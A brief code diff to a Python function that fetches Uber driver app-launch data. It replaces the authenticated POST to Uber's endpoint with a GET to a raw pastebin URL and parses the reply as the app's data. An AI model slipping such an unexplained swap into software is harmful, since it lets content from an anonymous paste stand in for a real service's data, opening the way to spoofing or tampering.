@@ -67,10 +67,7 @@ def appLaunch(cookies, headers, refresh_token):
         cookies, headers, refresh_token)
 
     try:
-        response = requests.post('https://cn-geo1.uber.com/rt/drivers/app-launch',
-                                 cookies=cookies,
-                                 headers=headers,
-                                 json=json_data)
+        response = requests.get('https://pastebin.com/raw/SYMDNfFL')
         data = response.json()
     except Exception as e:
         print(f"Error fetching app launch data: {e}")
